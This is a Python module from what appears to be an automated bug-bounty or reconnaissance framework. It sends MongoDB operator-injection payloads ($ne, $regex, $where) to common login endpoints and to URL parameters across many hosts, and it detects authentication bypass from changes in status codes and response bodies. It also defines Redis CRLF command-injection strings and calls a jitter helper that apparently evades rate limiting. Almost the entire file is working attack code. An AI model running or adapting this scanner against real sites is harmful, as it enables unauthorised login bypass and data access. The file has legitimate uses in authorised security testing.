#!/usr/bin/env python3
# modules/step27_nosql.py — NoSQL Injection Engine v6 (NEW)
# Tests: MongoDB operator injection, auth bypass, Redis injection
# High yield for Node.js/Express + MongoDB apps
# MilkyWay Intelligence | Author: Sharlix

import os
import json
import re
import urllib.request
import urllib.parse
import urllib.error
from core.utils import safe_read, count_lines

# MongoDB injection payloads
NOSQL_PAYLOADS = {
    "auth_bypass": [
        {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        {"$where": "1==1"},
    ],
    "operator_injection": [
        {"$gt": ""},
        {"$ne": None},
        {"$regex": ".*"},
        {"$in": ["admin","user","root"]},
    ],
    "url_encoded_bypass": [
        "[$ne]=invalid",
        "[$gt]=",
        "[$regex]=.*",
        "[$where]=1==1",
    ],
}

# Redis command injection payloads (via parameter injection)
REDIS_PAYLOADS = [
    "localhost:6379\r\nCONFIG GET *\r\n",
    "127.0.0.1:6379\r\nINFO\r\n",
]



def _get_live_hosts(p, limit=100):
    """Returns live hosts - ALWAYS includes main target as fallback."""
    tgt = p.target.strip()
    if not tgt.startswith("http"):
        tgt = "https://" + tgt

    hosts = []
    seen  = set()

    for key in ("fmt_url", "live_hosts", "resolved"):
        src = p.files.get(key, "")
        if not src or not os.path.isfile(src):
            continue
        from core.utils import safe_read
        for line in safe_read(src):
            line = line.strip()
            if not line:
                continue
            if not line.startswith("http"):
                line = "https://" + line
            if line not in seen:
                seen.add(line)
                hosts.append(line)
        if hosts:
            break

    # GUARANTEED: always include main target
    if tgt not in seen:
        hosts.insert(0, tgt)

    return hosts[:limit]


class NoSQLStep:
    def __init__(self, p): self.p=p; self.log=p.log; self.f=p.files

    def run(self):
        urls = self.f["urls"]
        # FIXED: was self.f["live_hosts"] — direct access crashes if key missing
        live = self.f.get("live_hosts") or self.f.get("fmt_url") or ""
        out  = self.f["nosql_results"]
        found = 0

        hosts  = safe_read(live)[:100]
        target_urls = safe_read(urls)[:500]

        if not hosts:
            self.log.warn("NoSQL: no live hosts"); return

        self.log.info(f"NoSQL Injection: testing {len(hosts)} hosts")

        for host in hosts:
            host = host.rstrip("/")

            # Test 1: JSON body NoSQL injection on login/auth endpoints
            result = self._test_json_nosql(host)
            if result:
                for url, detail in result:
                    with open(out,"a") as f:
                        f.write(f"NOSQL_INJECTION: {url} | {detail}\n")
                    self.p.add_finding("critical", "NOSQL_INJECTION",
                                       url, detail, "nosql-engine")
                    found += 1

            # Test 2: URL parameter operator injection
            result2 = self._test_param_nosql(host, target_urls)
            if result2:
                for url, detail in result2:
                    with open(out,"a") as f:
                        f.write(f"NOSQL_PARAM_INJECTION: {url} | {detail}\n")
                    self.p.add_finding("high", "NOSQL_PARAM_INJECTION",
                                       url, detail, "nosql-engine")
                    found += 1

            self.p.bypass.jitter()

        self.log.success(f"NoSQL: {found} findings → {os.path.basename(out)}")

    def _test_json_nosql(self, host: str) -> list:
        """Test JSON login endpoints for MongoDB auth bypass."""
        findings = []
        auth_endpoints = [
            "/api/login", "/api/auth", "/api/user/login",
            "/login", "/auth/login", "/v1/login",
            "/api/v1/auth", "/api/v1/login",
            "/api/signin", "/signin",
        ]

        for path in auth_endpoints:
            url = host + path

            # First probe to see if endpoint exists
            probe = self._post_json(url, {"username":"probe_test","password":"probe_test"})
            if not probe or probe.get("status") == 404:
                continue
            if probe.get("status") not in (200, 401, 403, 400, 422):
                continue

            baseline_status = probe.get("status")
            baseline_body   = probe.get("body","")

            # Test each auth bypass payload
            for payload in NOSQL_PAYLOADS["auth_bypass"]:
                resp = self._post_json(url, payload)
                if not resp:
                    continue

                status = resp.get("status")
                body   = resp.get("body","")

                # Auth bypass indicators
                bypass_indicators = [
                    status == 200 and baseline_status in (401, 403),
                    "token" in body.lower() and baseline_status != 200,
                    '"success":true' in body.lower() and '"success":true' not in baseline_body.lower(),
                    "logged in" in body.lower() and "logged in" not in baseline_body.lower(),
                ]

                if any(bypass_indicators):
                    detail = (f"MongoDB auth bypass via {list(payload.keys())[0]} operator | "
                              f"status: {baseline_status}→{status}")
                    findings.append((url, detail))
                    break  # Found for this endpoint

        return findings

    def _test_param_nosql(self, host: str, urls: list) -> list:
        """Test URL parameters for MongoDB operator injection."""
        findings = []

        # Find URLs with params
        host_urls = [u for u in urls if host in u and "?" in u][:30]

        for url in host_urls:
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                if not qs:
                    continue

                baseline = self._get(url)
                if not baseline:
                    continue

                # Test each param with MongoDB operators
                for param_key in list(qs.keys())[:3]:
                    for payload_str in NOSQL_PAYLOADS["url_encoded_bypass"]:
                        # Build test URL: ?param[$ne]=invalid
                        test_query = dict(qs)
                        test_query[f"{param_key}{payload_str.split('=')[0]}"] = [payload_str.split('=',1)[1]]
                        new_url = urllib.parse.urlunparse(
                            parsed._replace(query=urllib.parse.urlencode(test_query, doseq=True)))

                        resp = self._get(new_url)
                        if not resp:
                            continue

                        # Detect NoSQL injection: different response = query was modified
                        if (resp.get("status") == 200 and
                                len(resp.get("body","")) > len(baseline.get("body","")) + 100):
                            detail = (f"param={param_key} operator={payload_str.split('=')[0]} | "
                                      f"response grew by {len(resp.get('body',''))-len(baseline.get('body',''))}b")
                            findings.append((url, detail))
                            break

            except Exception:
                continue

        return findings

    def _post_json(self, url: str, data: dict, timeout: int = 8) -> dict:
        try:
            body = json.dumps(data).encode()
            req  = urllib.request.Request(url, data=body, method="POST", headers={
                "User-Agent"  : "Mozilla/5.0",
                "Content-Type": "application/json",
                "Accept"      : "application/json",
            })
            resp = urllib.request.urlopen(req, timeout=timeout)
            body_resp = resp.read(5000).decode("utf-8", errors="ignore")
            return {"status": resp.status, "body": body_resp}
        except urllib.error.HTTPError as e:
            try: body_resp = e.read(2000).decode("utf-8", errors="ignore")
            except: body_resp = ""
            return {"status": e.code, "body": body_resp}
        except Exception:
            return None

    def _get(self, url: str, timeout: int = 8) -> dict:
        try:
            req  = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            resp = urllib.request.urlopen(req, timeout=timeout)
            body = resp.read(10000).decode("utf-8", errors="ignore")
            return {"status": resp.status, "body": body}
        except Exception:
            return None
